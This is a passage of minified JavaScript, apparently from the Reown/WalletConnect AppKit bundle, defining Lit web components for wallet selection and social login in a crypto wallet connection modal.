              tabIdx=${ye(this.tabIdx)}
            ></wui-logo-select>`)}
      </wui-flex>`:F` <wui-list-social
      data-testid=${`social-selector-${e[0]}`}
      @click=${()=>{this.onSocialClick(e[0])}}
      logo=${ye(e[0])}
      align="center"
      name=${`Continue with ${e[0]}`}
      tabIdx=${ye(this.tabIdx)}
    ></wui-list-social>`}bottomViewTemplate(){let e=this.features?.socials;const t=this.walletGuide==="explore";return(!this.authConnector||!e||!e?.length)&&t&&(e=kr.DEFAULT_FEATURES.socials),!e||e.length<=az?null:e&&e.length>cz?F`<wui-flex gap="xs">
        ${e.slice(1,cz-1).map(n=>F`<wui-logo-select
              data-testid=${`social-selector-${n}`}
              @click=${()=>{this.onSocialClick(n)}}
              logo=${n}
              tabIdx=${ye(this.tabIdx)}
            ></wui-logo-select>`)}
        <wui-logo-select
          logo="more"
          tabIdx=${ye(this.tabIdx)}
          @click=${this.onMoreSocialsClick.bind(this)}
        ></wui-logo-select>
      </wui-flex>`:e?F`<wui-flex gap="xs">
      ${e.slice(1,e.length).map(n=>F`<wui-logo-select
            data-testid=${`social-selector-${n}`}
            @click=${()=>{this.onSocialClick(n)}}
            logo=${n}
            tabIdx=${ye(this.tabIdx)}
          ></wui-logo-select>`)}
    </wui-flex>`:null}onMoreSocialsClick(){Ee.push("ConnectSocials")}async onSocialClick(e){if(!Me.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(i=>i===re.state.activeChain)){const i=re.getFirstCaipNetworkSupportsAuthConnector();if(i){Ee.push("SwitchNetwork",{network:i});return}}if(e&&(Se.setSocialProvider(e,re.state.activeChain),Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_STARTED",properties:{provider:e}})),e===y7.Farcaster){Ee.push("ConnectingFarcaster");const i=Xe.getAuthConnector();if(i&&!Se.state.farcasterUrl)try{const{url:n}=await i.provider.getFarcasterUri();Se.setFarcasterUrl(n,re.state.activeChain)}catch(n){Ee.goBack(),vt.showError(n)}}else{Ee.push("ConnectingSocial");const i=Xe.getAuthConnector();try{if(i&&e){if(ke.isTelegram()||(this.popupWindow=ke.returnOpenHref("","popupWindow","width=600,height=800,scrollbars=yes")),this.popupWindow)Se.setSocialWindow(this.popupWindow,re.state.activeChain);else if(!ke.isTelegram())throw new Error("Something went wrong");const{uri:n}=await i.provider.getSocialRedirectUri({provider:e});if(!n)throw this.popupWindow?.close(),new Error("Something went wrong");if(this.popupWindow&&(this.popupWindow.location.href=n),ke.isTelegram()){_r.setItem(Mr.SOCIAL_PROVIDER,e);const s=ke.formatTelegramSocialLoginUrl(n);return ke.openHref(s,"_top")}}}catch{this.popupWindow?.close(),vt.showError("Something went wrong")}}}};bp.styles=kMe;O3([V()],bp.prototype,"walletGuide",void 0);O3([V()],bp.prototype,"tabIdx",void 0);O3([te()],bp.prototype,"connectors",void 0);O3([te()],bp.prototype,"features",void 0);O3([te()],bp.prototype,"authConnector",void 0);bp=O3([me("w3m-social-login-widget")],bp);var ite=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let eN=class extends he{constructor(){super(...arguments),this.tabIdx=void 0}render(){return F`
      <wui-flex flexDirection="column" gap="xs">
        <w3m-connector-list tabIdx=${ye(this.tabIdx)}></w3m-connector-list>
        <w3m-all-wallets-widget tabIdx=${ye(this.tabIdx)}></w3m-all-wallets-widget>
      </wui-flex>
    `}};ite([V()],eN.prototype,"tabIdx",void 0);eN=ite([me("w3m-wallet-login-list")],eN);const NMe=ge`
  :host {
    margin-top: var(--wui-spacing-3xs);
  }
  wui-separator {
    margin: var(--wui-spacing-m) calc(var(--wui-spacing-m) * -1) var(--wui-spacing-xs)
      calc(var(--wui-spacing-m) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`;var j4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ag=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.authConnector=this.connectors.find(e=>e.type==="AUTH"),this.features=Ne.state.features,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>{this.connectors=e,this.authConnector=this.connectors.find(t=>t.type==="AUTH")}),Ne.subscribeKey("features",e=>this.features=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){let e=this.features?.socials||[];const t=!!this.authConnector,i=e?.length,n=Ee.state.view==="ConnectSocials";return(!t||!i)&&!n?null:(n&&!i&&(e=kr.DEFAULT_FEATURES.socials),F` <wui-flex flexDirection="column" gap="xs">
      ${e.map(s=>F`<wui-list-social
            @click=${()=>{this.onSocialClick(s)}}
            name=${s}
            logo=${s}
            tabIdx=${ye(this.tabIdx)}
          ></wui-list-social>`)}
    </wui-flex>`)}async onSocialClick(e){if(e&&(Se.setSocialProvider(e,re.state.activeChain),Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_STARTED",properties:{provider:e}})),e===y7.Farcaster){Ee.push("ConnectingFarcaster");const t=Xe.getAuthConnector();if(t&&!Se.state.farcasterUrl)try{const{url:i}=await t.provider.getFarcasterUri();Se.setFarcasterUrl(i,re.state.activeChain)}catch(i){Ee.goBack(),vt.showError(i)}}else{Ee.push("ConnectingSocial");const t=Xe.getAuthConnector();this.popupWindow=ke.returnOpenHref("","popupWindow","width=600,height=800,scrollbars=yes");try{if(t&&e){const{uri:i}=await t.provider.getSocialRedirectUri({provider:e});if(this.popupWindow&&i)Se.setSocialWindow(this.popupWindow,re.state.activeChain),this.popupWindow.location.href=i;else throw this.popupWindow?.close(),new Error("Something went wrong")}}catch{this.popupWindow?.close(),vt.showError("Something went wrong")}}}};Ag.styles=NMe;j4([V()],Ag.prototype,"tabIdx",void 0);j4([te()],Ag.prototype,"connectors",void 0);j4([te()],Ag.prototype,"authConnector",void 0);j4([te()],Ag.prototype,"features",void 0);Ag=j4([me("w3m-social-login-list")],Ag);var rO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let L7=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.filter(t=>t.type==="ANNOUNCED");return e?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.map(t=>t.info?.rdns&&Ft.state.excludedRDNS&&Ft.state.excludedRDNS.includes(t?.info?.rdns)?null:F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getConnectorImage(t))}
              name=${t.name??"Unknown"}
              @click=${()=>this.onConnector(t)}
              tagVariant="success"
              tagLabel="installed"
              data-testid=${`wallet-selector-${t.id}`}
              .installed=${!0}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){e.id==="walletConnect"?ke.isMobile()?Ee.push("AllWallets"):Ee.push("ConnectingWalletConnect"):Ee.push("ConnectingExternal",{connector:e})}};rO([V()],L7.prototype,"tabIdx",void 0);rO([te()],L7.prototype,"connectors",void 0);L7=rO([me("w3m-connect-announced-widget")],L7);var UC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let gy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.loading=!1,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e)),ke.isTelegram()&&ke.isIos()&&(this.loading=!ft.state.wcUri,this.unsubscribe.push(ft.subscribeKey("wcUri",e=>this.loading=!e)))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{customWallets:e}=Ne.state;if(!e?.length)return this.style.cssText="display: none",null;const t=this.filterOutDuplicateWallets(e);return F`<wui-flex flexDirection="column" gap="xs">
      ${t.map(i=>F`
          <wui-list-wallet
            imageSrc=${ye(Nr.getWalletImage(i))}
            name=${i.name??"Unknown"}
            @click=${()=>this.onConnectWallet(i)}
            data-testid=${`wallet-selector-${i.id}`}
            tabIdx=${ye(this.tabIdx)}
            ?loading=${this.loading}
          >
          </wui-list-wallet>
        `)}
    </wui-flex>`}filterOutDuplicateWallets(e){const t=He.getRecentWallets(),i=this.connectors.map(a=>a.info?.rdns).filter(Boolean),n=t.map(a=>a.rdns).filter(Boolean),s=i.concat(n);if(s.includes("io.metamask.mobile")&&ke.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return e.filter(a=>!s.includes(String(a?.rdns)))}onConnectWallet(e){this.loading||Ee.push("ConnectingWalletConnect",{wallet:e})}};UC([V()],gy.prototype,"tabIdx",void 0);UC([te()],gy.prototype,"connectors",void 0);UC([te()],gy.prototype,"loading",void 0);gy=UC([me("w3m-connect-custom-widget")],gy);var nte=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let tN=class extends he{constructor(){super(...arguments),this.unsubscribe=[],this.tabIdx=void 0}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{featured:e}=Ft.state;if(!e.length)return this.style.cssText="display: none",null;const t=d0.filterOutDuplicateWallets(e);return F`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(i=>F`
            <wui-list-wallet
              data-testid=${`wallet-selector-featured-${i.id}`}
              imageSrc=${ye(Nr.getWalletImage(i))}
              name=${i.name??"Unknown"}
              @click=${()=>this.onConnectWallet(i)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `}onConnectWallet(e){Xe.selectWalletConnector(e)}};nte([V()],tN.prototype,"tabIdx",void 0);tN=nte([me("w3m-connect-featured-widget")],tN);var iO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let U7=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.filter(t=>t.type==="INJECTED");return!e?.length||e.length===1&&e[0]?.name==="Browser Wallet"&&!ke.isMobile()?(this.style.cssText="display: none",null):F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.map(t=>{if(!ke.isMobile()&&t.name==="Browser Wallet")return null;const i=t.info?.rdns;return!i&&!ft.checkInstalled(void 0)?(this.style.cssText="display: none",null):i&&Ft.state.excludedRDNS&&Ft.state.excludedRDNS.includes(i)?null:F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getConnectorImage(t))}
              .installed=${!0}
              name=${t.name??"Unknown"}
              tagVariant="success"
              tagLabel="installed"
              data-testid=${`wallet-selector-${t.id}`}
              @click=${()=>this.onConnector(t)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `})}
      </wui-flex>
    `}onConnector(e){Xe.setActiveConnector(e),Ee.push("ConnectingExternal",{connector:e})}};iO([V()],U7.prototype,"tabIdx",void 0);iO([te()],U7.prototype,"connectors",void 0);U7=iO([me("w3m-connect-injected-widget")],U7);var nO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let j7=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.filter(t=>t.type==="MULTI_CHAIN"&&t.name!=="WalletConnect");return e?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.map(t=>F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getConnectorImage(t))}
              .installed=${!0}
              name=${t.name??"Unknown"}
              tagVariant="shade"
              tagLabel="multichain"
              data-testid=${`wallet-selector-${t.id}`}
              @click=${()=>this.onConnector(t)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){Xe.setActiveConnector(e),Ee.push("ConnectingMultiChain")}};nO([V()],j7.prototype,"tabIdx",void 0);nO([te()],j7.prototype,"connectors",void 0);j7=nO([me("w3m-connect-multi-chain-widget")],j7);var sO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let F7=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const t=this.connectors.filter(i=>i.type==="EXTERNAL").filter(i=>i.id!==Me.CONNECTOR_ID.COINBASE_SDK);return t?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(i=>F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getConnectorImage(i))}
              .installed=${!0}
              name=${i.name??"Unknown"}
              data-testid=${`wallet-selector-external-${i.id}`}
              @click=${()=>this.onConnector(i)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){Ee.push("ConnectingExternal",{connector:e})}};sO([V()],F7.prototype,"tabIdx",void 0);sO([te()],F7.prototype,"connectors",void 0);F7=sO([me("w3m-connect-external-widget")],F7);var jC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let my=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.loading=!1,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e)),ke.isTelegram()&&ke.isIos()&&(this.loading=!ft.state.wcUri,this.unsubscribe.push(ft.subscribeKey("wcUri",e=>this.loading=!e)))}render(){const t=He.getRecentWallets().filter(i=>!this.connectors.some(n=>n.id===i.id||n.name===i.name));return t.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(i=>F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getWalletImage(i))}
              name=${i.name??"Unknown"}
              @click=${()=>this.onConnectWallet(i)}
              tagLabel="recent"
              tagVariant="shade"
              tabIdx=${ye(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(e){this.loading||Xe.selectWalletConnector(e)}};jC([V()],my.prototype,"tabIdx",void 0);jC([te()],my.prototype,"connectors",void 0);jC([te()],my.prototype,"loading",void 0);my=jC([me("w3m-connect-recent-widget")],my);var FC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.loading=!1,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e)),ke.isTelegram()&&ke.isIos()&&(this.loading=!ft.state.wcUri,this.unsubscribe.push(ft.subscribeKey("wcUri",e=>this.loading=!e)))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!this.connectors.find(h=>h.id==="walletConnect"))return null;const{recommended:t}=Ft.state,{customWallets:i,featuredWalletIds:n}=Ne.state,{connectors:s}=Xe.state,o=He.getRecentWallets(),c=s.filter(h=>h.type==="INJECTED"||h.type==="ANNOUNCED"||h.type==="MULTI_CHAIN").filter(h=>h.name!=="Browser Wallet");if(n||i||!t.length)return this.style.cssText="display: none",null;const l=c.length+o.length,u=Math.max(0,2-l),d=d0.filterOutDuplicateWallets(t).slice(0,u);return d.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${d.map(h=>F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getWalletImage(h))}
              name=${h?.name??"Unknown"}
              @click=${()=>this.onConnectWallet(h)}
              tabIdx=${ye(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(e){if(this.loading)return;const t=Xe.getConnector(e.id,e.rdns);t?Ee.push("ConnectingExternal",{connector:t}):Ee.push("ConnectingWalletConnect",{wallet:e})}};FC([V()],wy.prototype,"tabIdx",void 0);FC([te()],wy.prototype,"connectors",void 0);FC([te()],wy.prototype,"loading",void 0);wy=FC([me("w3m-connect-recommended-widget")],wy);var qC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let by=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.connectorImages=Li.state.connectorImages,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e),Li.subscribeKey("connectorImages",e=>this.connectorImages=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(ke.isMobile())return this.style.cssText="display: none",null;const e=this.connectors.find(i=>i.id==="walletConnect");if(!e)return this.style.cssText="display: none",null;const t=e.imageUrl||this.connectorImages[e?.imageId??""];return F`
      <wui-list-wallet
        imageSrc=${ye(t)}
        name=${e.name??"Unknown"}
        @click=${()=>this.onConnector(e)}
        tagLabel="qr code"
        tagVariant="main"
        tabIdx=${ye(this.tabIdx)}
        data-testid="wallet-selector-walletconnect"
      >
      </wui-list-wallet>
    `}onConnector(e){Xe.setActiveConnector(e),Ee.push("ConnectingWalletConnect")}};qC([V()],by.prototype,"tabIdx",void 0);qC([te()],by.prototype,"connectors",void 0);qC([te()],by.prototype,"connectorImages",void 0);by=qC([me("w3m-connect-walletconnect-widget")],by);const PMe=ge`
  :host {
    margin-top: var(--wui-spacing-3xs);
  }
  wui-separator {
    margin: var(--wui-spacing-m) calc(var(--wui-spacing-m) * -1) var(--wui-spacing-xs)
      calc(var(--wui-spacing-m) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`;var oO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let vy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{custom:e,recent:t,announced:i,injected:n,multiChain:s,recommended:o,featured:a,external:c}=u9.getConnectorsByType(this.connectors),l=Ne.state.enableWalletConnect;return F`
      <wui-flex flexDirection="column" gap="xs">
        ${l?F`<w3m-connect-walletconnect-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-walletconnect-widget>`:null}
        ${t.length?F`<w3m-connect-recent-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-recent-widget>`:null}
        ${s.length?F`<w3m-connect-multi-chain-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-multi-chain-widget>`:null}
        ${i.length?F`<w3m-connect-announced-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-announced-widget>`:null}
        ${n.length?F`<w3m-connect-injected-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-injected-widget>`:null}
        ${a.length?F`<w3m-connect-featured-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-featured-widget>`:null}
        ${e?.length?F`<w3m-connect-custom-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-custom-widget>`:null}
        ${c.length?F`<w3m-connect-external-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-external-widget>`:null}
        ${o.length?F`<w3m-connect-recommended-widget
              tabIdx=${ye(this.tabIdx)}
            ></w3m-connect-recommended-widget>`:null}
      </wui-flex>
    `}};vy.styles=PMe;oO([V()],vy.prototype,"tabIdx",void 0);oO([te()],vy.prototype,"connectors",void 0);vy=oO([me("w3m-connector-list")],vy);var zC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let yy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Xe.state.connectors,this.count=Ft.state.count,this.unsubscribe.push(Xe.subscribeKey("connectors",e=>this.connectors=e),Ft.subscribeKey("count",e=>this.count=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.find(a=>a.id==="walletConnect"),{allWallets:t}=Ne.state;if(!e||t==="HIDE"||t==="ONLY_MOBILE"&&!ke.isMobile())return null;const i=Ft.state.featured.length,n=this.count+i,s=n<10?n:Math.floor(n/10)*10,o=s<n?`${s}+`:`${s}`;return F`
      <wui-list-wallet
        name="All Wallets"
        walletIcon="allWallets"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${o}
        tagVariant="shade"
        data-testid="all-wallets"
        tabIdx=${ye(this.tabIdx)}
      ></wui-list-wallet>
    `}onAllWallets(){Ve.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),Ee.push("AllWallets")}};zC([V()],yy.prototype,"tabIdx",void 0);zC([te()],yy.prototype,"connectors",void 0);zC([te()],yy.prototype,"count",void 0);yy=zC([me("w3m-all-wallets-widget")],yy);var ste=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let rN=class extends he{constructor(){super(),this.unsubscribe=[],this.socialProvider=He.getConnectedSocialProvider(),this.socialUsername=He.getConnectedSocialUsername(),this.namespace=re.state.activeChain,this.unsubscribe.push(re.subscribeKey("activeChain",e=>{this.namespace=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=He.getConnectedConnectorId(this.namespace),t=Xe.getAuthConnector();if(!t||e!==Me.CONNECTOR_ID.AUTH)return this.style.cssText="display: none",null;const i=t.provider.getEmail()??"";return F`
      <wui-list-item
        variant="icon"
        iconVariant="overlay"
        icon=${this.socialProvider??"mail"}
        iconSize=${this.socialProvider?"xxl":"sm"}
        data-testid="w3m-account-email-update"
        ?chevron=${!this.socialProvider}
        @click=${()=>{this.onGoToUpdateEmail(i,this.socialProvider)}}
      >
        <wui-text variant="paragraph-500" color="fg-100">${this.getAuthName(i)}</wui-text>
      </wui-list-item>
    `}onGoToUpdateEmail(e,t){t||Ee.push("UpdateEmailWallet",{email:e})}getAuthName(e){return this.socialUsername?this.socialProvider==="discord"&&this.socialUsername.endsWith("0")?this.socialUsername.slice(0,-1):this.socialUsername:e.length>30?`${e.slice(0,-3)}...`:e}};ste([te()],rN.prototype,"namespace",void 0);rN=ste([me("w3m-account-auth-button")],rN);const $Me=ge`
  wui-flex {
    width: 100%;
  }

  .wallet-guide {
    width: 100%;
  }

  .chip-box {
    width: fit-content;
    background-color: var(--wui-color-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
  }
`;var aO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let xy=class extends he{constructor(){super(...arguments),this.walletGuide="get-started"}render(){return this.walletGuide==="explore"?F`<wui-flex
          class="wallet-guide"
          flexDirection="column"
          alignItems="center"
          justifyContent="center"
          rowGap="xs"
          data-testid="w3m-wallet-guide-explore"
        >
          <wui-text variant="small-400" color="fg-200" align="center">
            Looking for a self-custody wallet?
          </wui-text>

          <wui-flex class="chip-box">
            <wui-chip
              imageIcon="walletConnectLightBrown"
              icon="externalLink"
              variant="transparent"
              href="https://walletguide.walletconnect.network"
              title="Find one on WalletGuide"
            ></wui-chip>
          </wui-flex>
        </wui-flex>`:F`<wui-flex
          columnGap="4xs"
          flexDirection="row"
          alignItems="center"
          justifyContent="center"
        >
          <wui-text variant="small-400" class="title" color="fg-200"
            >Haven't got a wallet?</wui-text
          >
          <wui-link
            data-testid="w3m-wallet-guide-get-started"
            color="blue-100"
            class="get-started-link"
            @click=${this.onGetStarted}
            tabIdx=${ye(this.tabIdx)}
          >
            Get started
          </wui-link>
        </wui-flex>`}onGetStarted(){Ee.push("Create")}};xy.styles=$Me;aO([V()],xy.prototype,"tabIdx",void 0);aO([V()],xy.prototype,"walletGuide",void 0);xy=aO([me("w3m-wallet-guide")],xy);const RMe=ge`
  :host {
    display: flex;
    justify-content: center;
    gap: var(--wui-spacing-2xl);
  }

  wui-visual-thumbnail:nth-child(1) {
    z-index: 1;
  }
`;var OMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let iN=class extends he{constructor(){super(...arguments),this.dappImageUrl=Ne.state.metadata?.icons,this.walletImageUrl=Se.state.connectedWalletInfo?.icon}firstUpdated(){const e=this.shadowRoot?.querySelectorAll("wui-visual-thumbnail");e?.[0]&&this.createAnimation(e[0],"translate(18px)"),e?.[1]&&this.createAnimation(e[1],"translate(-18px)")}render(){return F`
      <wui-visual-thumbnail
        ?borderRadiusFull=${!0}
        .imageSrc=${this.dappImageUrl?.[0]}
      ></wui-visual-thumbnail>
      <wui-visual-thumbnail .imageSrc=${this.walletImageUrl}></wui-visual-thumbnail>
